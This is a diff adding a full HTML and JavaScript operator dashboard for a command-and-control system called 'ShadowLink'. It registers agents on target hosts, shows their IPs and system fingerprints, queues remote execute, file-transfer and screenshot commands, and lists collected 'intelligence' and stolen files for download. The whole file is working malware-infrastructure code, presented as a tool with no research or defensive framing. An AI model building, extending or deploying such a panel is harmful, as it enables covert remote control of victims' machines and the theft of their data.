@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShadowLink - HQ Command Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            border-bottom: 2px solid #30363d;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            color: #58a6ff;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header-subtitle {
+            color: #8b949e;
+            font-size: 14px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #30363d;
+        }
+        
+        .tab {
+            padding: 12px 20px;
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s;
+        }
+        
+        .tab:hover {
+            color: #58a6ff;
+        }
+        
+        .tab.active {
+            color: #58a6ff;
+            border-bottom-color: #58a6ff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .panel {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            overflow: hidden;
+        }
+        
+        .panel h2 {
+            color: #58a6ff;
+            font-size: 16px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 10px;
+        }
+        
+        .panel h3 {
+            color: #79c0ff;
+            font-size: 14px;
+            margin: 15px 0 10px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #8b949e;
+            font-size: 13px;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 8px 12px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #58a6ff;
+            box-shadow: 0 0 10px rgba(88, 166, 255, 0.2);
+        }
+        
+        button {
+            background: #238636;
+            color: #ffffff;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: #2ea043;
+        }
+        
+        button.secondary {
+            background: #30363d;
+            color: #c9d1d9;
+        }
+        
+        button.secondary:hover {
+            background: #3d444d;
+        }
+        
+        button.danger {
+            background: #da3633;
+        }
+        
+        button.danger:hover {
+            background: #f85149;
+        }
+        
+        .agents-list {
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        
+        .agent-item {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .agent-item:hover {
+            background: #161b22;
+            border-color: #58a6ff;
+        }
+        
+        .agent-item.selected {
+            background: #161b22;
+            border-color: #58a6ff;
+        }
+        
+        .agent-id {
+            color: #58a6ff;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .agent-status {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-bottom: 5px;
+        }
+        
+        .agent-status.online {
+            background: #238636;
+            color: #ffffff;
+        }
+        
+        .agent-status.offline {
+            background: #da3633;
+            color: #ffffff;
+        }
+        
+        .agent-meta {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 5px;
+        }
+        
+        .commands-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .command-item {
+            background: #0d1117;
+            border-left: 3px solid #58a6ff;
+            padding: 10px;
+            margin-bottom: 8px;
+            border-radius: 2px;
+        }
+        
+        .command-id {
+            color: #79c0ff;
+            font-size: 12px;
+            margin-bottom: 3px;
+        }
+        
+        .command-type {
+            color: #58a6ff;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+        
+        .command-status {
+            display: inline-block;
+            padding: 2px 6px;
+            border-radius: 2px;
+            font-size: 11px;
+            background: #30363d;
+            color: #8b949e;
+        }
+        
+        .intel-item {
+            background: #0d1117;
+            border-left: 3px solid #79c0ff;
+            padding: 10px;
+            margin-bottom: 8px;
+            border-radius: 2px;
+        }
+        
+        .intel-type {
+            color: #79c0ff;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+        
+        .intel-time {
+            font-size: 12px;
+            color: #8b949e;
+        }
+        
+        .intel-data {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 8px;
+            margin-top: 5px;
+            border-radius: 3px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-size: 12px;
+            word-break: break-all;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        
+        .success {
+            color: #3fb950;
+        }
+        
+        .error {
+            color: #f85149;
+        }
+        
+        .warning {
+            color: #d29922;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .stat-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            color: #58a6ff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            color: #8b949e;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        .agent-details {
+            background: #0d1117;
+            border-left: 3px solid #58a6ff;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 2px;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        
+        .agent-details-panel {
+            grid-column: 1 / -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>⚔️ ShadowLink - HQ Command Center</h1>
+            <div class="header-subtitle">Central Command & Control Interface</div>
+        </header>
+        
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('agents')">Agents</button>
+            <button class="tab" onclick="switchTab('commands')">Commands</button>
+            <button class="tab" onclick="switchTab('intel')">Intelligence</button>
+        </div>
+        
+        <!-- Agents Tab -->
+        <div id="agents" class="tab-content active">
+            <div class="grid">
+                <!-- Create Agent -->
+                <div class="panel">
+                    <h2>Create New Agent</h2>
+                    <form onsubmit="createAgent(event)">
+                        <div class="form-group">
+                            <label>Agent Name</label>
+                            <input type="text" id="agentName" placeholder="e.g., target-host-01" required>
+                        </div>
+                        <button type="submit">Create Agent</button>
+                    </form>
+                    <div id="createdAgentInfo" style="margin-top: 20px; display: none;">
+                        <h3>Agent Created ✓</h3>
+                        <div class="code-block">
+                            <strong>Registration Code:</strong><br>
+                            <span id="regCode"></span>
+                            <button class="secondary" style="margin-top: 10px; width: 100%;" onclick="copyToClipboard('regCode')">Copy Code</button>
+                        </div>
+                        <div class="code-block" style="margin-top: 10px;">
+                            <strong>API Key:</strong><br>
+                            <span id="apiKey" style="word-break: break-all;"></span>
+                            <button class="secondary" style="margin-top: 10px; width: 100%;" onclick="copyToClipboard('apiKey')">Copy Key</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Active Agents -->
+                <div class="panel">
+                    <h2>Active Agents</h2>
+                    <div class="stats">
+                        <div class="stat-box">
+                            <div class="stat-value" id="totalAgents">0</div>
+                            <div class="stat-label">Total</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value success" id="onlineAgents">0</div>
+                            <div class="stat-label">Online</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value error" id="offlineAgents">0</div>
+                            <div class="stat-label">Offline</div>
+                        </div>
+                    </div>
+                    
+                    <div class="agents-list" id="agentsList" style="margin-top: 15px;">
+                        <p style="color: #8b949e;">Loading agents...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Commands Tab -->
+        <div id="commands" class="tab-content">
+            <div class="grid">
+                <!-- Send Command -->
+                <div class="panel">
+                    <h2>Send Command</h2>
+                    <div class="form-group">
+                        <label>Select Agent</label>
+                        <select id="commandAgent" onchange="selectCommandAgent()">
+                            <option value="">-- Select Agent --</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Command Type</label>
+                        <select id="commandType">
+                            <option value="exec">Execute</option>
+                            <option value="info">Info Gather</option>
+                            <option value="file">File Transfer</option>
+                            <option value="screenshot">Screenshot</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Payload / Details</label>
+                        <textarea id="commandPayload" rows="6" placeholder="Enter command details..."></textarea>
+                    </div>
+                    <button onclick="sendCommand()" style="width: 100%;">Send Command</button>
+                </div>
+                
+                <!-- Command History -->
+                <div class="panel">
+                    <h2>Command History</h2>
+                    <div class="commands-list" id="commandsList">
+                        <p style="color: #8b949e;">Select an agent to view commands</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Intelligence Tab -->
+        <div id="intel" class="tab-content">
+            <div class="grid">
+                <!-- Intel Summary -->
+                <div class="panel">
+                    <h2>📊 Intelligence Filters</h2>
+                    <div class="form-group">
+                        <label>Filter by Agent</label>
+                        <select id="intelAgent" onchange="filterIntel()">
+                            <option value="">-- All Agents --</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Filter by Type</label>
+                        <select id="intelType" onchange="filterIntel()">
+                            <option value="">-- All Types --</option>
+                            <option value="system_info">System Info</option>
+                            <option value="network_info">Network Info</option>
+                            <option value="files">Files</option>
+                            <option value="processes">Processes</option>
+                            <option value="file_upload">File Upload</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <!-- Intel Data -->
+                <div class="panel">
+                    <h2>📁 Collected Data & Files</h2>
+                    <div id="intelList" style="max-height: 600px; overflow-y: auto;">
+                        <p style="color: #8b949e;">No intelligence collected yet</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let currentAgent = null;
+        
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+            
+            // Refresh data
+            if (tabName === 'agents') loadAgents();
+            else if (tabName === 'commands') loadCommandsTab();
+            else if (tabName === 'intel') loadIntelTab();
+        }
+        
+        function createAgent() {
+            event.preventDefault();
+            const agentName = document.getElementById('agentName').value;
+            
+            fetch('/api/agents/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ agent_name: agentName })
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('regCode').textContent = data.registration_code;
+                document.getElementById('apiKey').textContent = data.api_key;
+                document.getElementById('createdAgentInfo').style.display = 'block';
+                document.getElementById('agentName').value = '';
+                loadAgents();
+            })
+            .catch(e => alert('Error: ' + e));
+        }
+        
+        function loadAgents() {
+            fetch('/api/agents')
+            .then(r => r.json())
+            .then(data => {
+                const agents = data.agents;
+                document.getElementById('totalAgents').textContent = agents.length;
+                document.getElementById('onlineAgents').textContent = agents.filter(a => a.status === 'online').length;
+                document.getElementById('offlineAgents').textContent = agents.filter(a => a.status === 'offline').length;
+                
+                const html = agents.map(agent => `
+                    <div class="agent-item" onclick="selectAgent('${agent.agent_id}')">
+                        <div class="agent-id">${agent.agent_id}</div>
+                        <span class="agent-status ${agent.status}">${agent.status.toUpperCase()}</span>
+                        <div class="agent-meta">
+                            IP: <strong>${agent.ip_address || 'N/A'}</strong> | Commands: ${agent.commands_count} | Intel: ${agent.intel_count}
+                        </div>
+                        <div class="agent-meta">
+                            Last heartbeat: ${new Date(agent.last_heartbeat).toLocaleString()}
+                        </div>
+                        <div style="margin-top: 8px;">
+                            <button class="secondary" style="width: 100%; padding: 6px; font-size: 11px;" onclick="event.stopPropagation(); deleteAgentConfirm('${agent.agent_id}')">
+                                🗑️ Delete
+                            </button>
+                        </div>
+                    </div>
+                `).join('');
+                
+                document.getElementById('agentsList').innerHTML = html || '<p style="color: #8b949e;">No agents created yet</p>';
+                
+                // Update dropdowns
+                updateAgentDropdowns(agents);
+            });
+        }
+        
+        function updateAgentDropdowns(agents) {
+            const agentIds = agents.map(a => a.agent_id);
+            
+            ['commandAgent', 'intelAgent'].forEach(id => {
+                const select = document.getElementById(id);
+                const selected = select.value;
+                select.innerHTML = '<option value="">-- Select Agent --</option>' +
+                    agentIds.map(a => `<option value="${a}">${a}</option>`).join('');
+                select.value = selected;
+            });
+        }
+        
+        function selectAgent(agentId) {
+            currentAgent = agentId;
+            document.getElementById('commandAgent').value = agentId;
+            loadCommandsForAgent(agentId);
+            
+            // Show agent details
+            const agentItem = Array.from(document.querySelectorAll('.agent-item')).find(el => 
+                el.textContent.includes(agentId)
+            );
+            
+            if (agentItem) {
+                agentItem.classList.add('selected');
+                showAgentDetails(agentId);
+            }
+        }
+        
+        function showAgentDetails(agentId) {
+            fetch('/api/agents')
+            .then(r => r.json())
+            .then(data => {
+                const agent = data.agents.find(a => a.agent_id === agentId);
+                if (agent) {
+                    const details = `
+                        <h3>📍 Agent Location & Info</h3>
+                        <div class="agent-details">
+                            <strong>IP Address:</strong> ${agent.ip_address || 'N/A'}<br>
+                            <strong>Status:</strong> <span class="agent-status ${agent.status}">${agent.status.toUpperCase()}</span><br>
+                            <strong>Last Heartbeat:</strong> ${new Date(agent.last_heartbeat).toLocaleString()}<br>
+                            <strong>Commands:</strong> ${agent.commands_count}<br>
+                            <strong>Intel Files:</strong> ${agent.intel_count}<br>
+                        </div>
+                        
+                        ${agent.system_info && Object.keys(agent.system_info).length > 0 ? `
+                            <h3 style="margin-top: 15px;">💻 System Information</h3>
+                            <div class="code-block" style="font-size: 11px;">
+                                ${agent.system_info.platform ? '<strong>Platform:</strong> ' + agent.system_info.platform + '<br>' : ''}
+                                ${agent.system_info.userAgent ? '<strong>User Agent:</strong> ' + (agent.system_info.userAgent.substring(0, 80) + '...') + '<br>' : ''}
+                                ${agent.system_info.language ? '<strong>Language:</strong> ' + agent.system_info.language + '<br>' : ''}
+                                ${agent.system_info.hardwareConcurrency ? '<strong>CPU Cores:</strong> ' + agent.system_info.hardwareConcurrency + '<br>' : ''}
+                                ${agent.system_info.deviceMemory ? '<strong>Device Memory:</strong> ' + agent.system_info.deviceMemory + ' GB<br>' : ''}
+                                ${agent.system_info.screen ? '<strong>Screen:</strong> ' + agent.system_info.screen.width + 'x' + agent.system_info.screen.height + '<br>' : ''}
+                                ${agent.system_info.timezone ? '<strong>Timezone:</strong> ' + agent.system_info.timezone + '<br>' : ''}
+                            </div>
+                        ` : ''}
+                        
+                        <div style="margin-top: 15px; display: flex; gap: 10px;">
+                            <button class="danger" style="flex: 1;" onclick="deleteAgentConfirm('${agent.agent_id}')">
+                                🗑️ Delete Agent
+                            </button>
+                        </div>
+                    `;
+                    
+                    const panel = document.createElement('div');
+                    panel.className = 'panel';
+                    panel.innerHTML = details;
+                    
+                    // Find and replace existing details panel or add new one
+                    const existingPanel = document.querySelector('.agent-details-panel');
+                    if (existingPanel) {
+                        existingPanel.replaceWith(panel);
+                    } else {
+                        panel.classList.add('agent-details-panel');
+                        const agentSection = document.querySelector('.grid');
+                        if (agentSection) {
+                            agentSection.insertBefore(panel, agentSection.children[1]);
+                        }
+                    }
+                }
+            });
+        }
+        
+        function deleteAgentConfirm(agentId) {
+            if (confirm(`⚠️ Are you sure you want to DELETE agent "${agentId}"?\n\nThis will also delete:\n- All pending commands\n- All collected intelligence\n- All file uploads\n\nThis action cannot be undone.`)) {
+                deleteAgent(agentId);
+            }
+        }
+        
+        function deleteAgent(agentId) {
+            fetch(`/api/agents/${agentId}`, {
+                method: 'DELETE'
+            })
+            .then(r => {
+                if (r.status === 200) {
+                    alert(`✓ Agent "${agentId}" has been deleted successfully`);
+                    loadAgents();
+                    currentAgent = null;
+                    document.getElementById('commandAgent').value = '';
+                    document.getElementById('commandsList').innerHTML = '<p style="color: #8b949e;">Select an agent to view commands</p>';
+                    const detailsPanel = document.querySelector('.agent-details-panel');
+                    if (detailsPanel) detailsPanel.remove();
+                } else {
+                    return r.json().then(data => {
+                        alert(`Error: ${data.error || 'Failed to delete agent'}`);
+                    });
+                }
+            })
+            .catch(e => alert(`Error: ${e.message}`));
+        }
+        
+        function selectCommandAgent() {
+            const agentId = document.getElementById('commandAgent').value;
+            if (agentId) loadCommandsForAgent(agentId);
+        }
+        
+        function loadCommandsForAgent(agentId) {
+            fetch(`/api/commands/${agentId}`)
+            .then(r => r.json())
+            .then(data => {
+                const commands = data.commands;
+                const html = commands.length > 0 ? commands.map(cmd => `
+                    <div class="command-item">
+                        <div class="command-id">ID: ${cmd.command_id}</div>
+                        <div class="command-type">${cmd.command_type}</div>
+                        <span class="command-status">pending</span>
+                    </div>
+                `).join('') : '<p style="color: #8b949e;">No pending commands</p>';
+                
+                document.getElementById('commandsList').innerHTML = html;
+            });
+        }
+        
+        function sendCommand() {
+            const agentId = document.getElementById('commandAgent').value;
+            const commandType = document.getElementById('commandType').value;
+            const payload = document.getElementById('commandPayload').value;
+            
+            if (!agentId) {
+                alert('Please select an agent');
+                return;
+            }
+            
+            fetch('/api/commands', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agent_id: agentId,
+                    command_type: commandType,
+                    payload: { details: payload }
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert('Command sent: ' + data.command_id);
+                document.getElementById('commandPayload').value = '';
+                loadCommandsForAgent(agentId);
+            })
+            .catch(e => alert('Error: ' + e));
+        }
+        
+        function loadCommandsTab() {
+            loadAgents();
+        }
+        
+        function loadIntelTab() {
+            loadAgents();
+            filterIntel();
+        }
+        
+        function filterIntel() {
+            const agentId = document.getElementById('intelAgent').value;
+            const intelType = document.getElementById('intelType').value;
+            
+            const url = agentId ? `/api/intel/${agentId}` : '/api/agents';
+            
+            fetch(url)
+            .then(r => r.json())
+            .then(data => {
+                let intel = [];
+                if (data.intelligence) {
+                    intel = data.intelligence;
+                } else {
+                    // Get intel from all agents
+                    data.agents.forEach(agent => {
+                        intel = intel.concat((agent.intel || []).map(i => ({
+                            ...i,
+                            agent_id: agent.agent_id
+                        })));
+                    });
+                }
+                
+                if (intelType) {
+                    intel = intel.filter(i => i.data_type === intelType);
+                }
+                
+                const html = intel.length > 0 ? intel.map(item => {
+                    let content = '';
+                    
+                    if (item.data_type === 'file_upload') {
+                        const fileData = item.data || {};
+                        const downloadUrl = item.file_path ? `/api/download-file/${encodeURIComponent(item.file_path)}` : '#';
+                        content = `
+                            <div class="intel-item">
+                                <div class="intel-type">📄 ${item.data_type}</div>
+                                <div class="intel-time">Agent: ${item.agent_id || 'Unknown'} | ${new Date(item.created_at).toLocaleString()}</div>
+                                <div class="intel-data">
+                                    <strong>File:</strong> ${fileData.original_name || 'N/A'}<br>
+                                    <strong>Size:</strong> ${formatBytes(fileData.size || 0)}<br>
+                                    <strong>Stored as:</strong> <span style="font-size: 11px; color: #6e7681;">${item.file_path || 'N/A'}</span><br>
+                                    <a href="${downloadUrl}" target="_blank" style="display: inline-block; margin-top: 8px; padding: 8px 12px; background: #238636; color: white; text-decoration: none; border-radius: 4px; font-size: 12px;">
+                                        ⬇️ Download File
+                                    </a>
+                                </div>
+                            </div>
+                        `;
+                    } else {
+                        content = `
+                            <div class="intel-item">
+                                <div class="intel-type">${item.data_type}</div>
+                                <div class="intel-time">Agent: ${item.agent_id || 'Unknown'} | ${new Date(item.created_at).toLocaleString()}</div>
+                                <div class="intel-data">${JSON.stringify(item.data || {}, null, 2)}</div>
+                            </div>
+                        `;
+                    }
+                    
+                    return content;
+                }).join('') : '<p style="color: #8b949e;">No intelligence data</p>';
+                
+                document.getElementById('intelList').innerHTML = html;
+            });
+        }
+        
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+        
+        function downloadFile(filename) {
+            window.open(`/api/download-file/${filename}`, '_blank');
+        }
+        
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied to clipboard!');
+            });
+        }
+        
+        // Load agents on page load
+        loadAgents();
+        // Poll agent status every 1 second
+        setInterval(loadAgents, 1000);
+    </script>
+</body>
+</html>
